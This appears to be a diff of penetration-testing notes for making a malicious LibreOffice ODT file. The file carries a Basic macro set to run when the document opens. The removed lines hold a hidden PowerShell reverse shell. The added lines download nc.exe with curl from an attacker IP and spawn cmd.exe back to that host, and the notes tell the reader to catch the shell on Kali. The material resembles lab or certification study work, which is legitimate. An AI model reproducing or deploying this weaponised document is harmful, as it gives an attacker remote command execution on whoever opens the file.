@@ -1,19 +1,20 @@
 -Create/Open ODT file using libreoffice
 -Tools > Macros > Organise Macros > Basic
 -Highlight the ODT file name > New
--Set Macro Name and then in macro body add the following code
+-Set Macro Name and then in macro body add the following code or some other code
 ~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++
 REM  *****  BASIC  *****
 
 Sub Main
-	shell("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.45.155",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
+Shell("curl http://192.168.45.155/nc.exe -o C:\Windows\Temp\nc.exe")
+Shell("C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.155 888")
 End Sub
 ~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++~~++
 -Save the macro (ctrl + s)
 -To set the Macro to Automatically Run by Clicking on Tools > Customize
 -In the events tab select "Open Document" and then select the "Macro" button.
 -In the new window highlight the created macro, then click ok and save (ctrl+s) 
--Macro Executes after upload when opened on the target
+-Macro Executes after upload when opened on the target. Catch reverse shell in nc on kali.
 
 
 
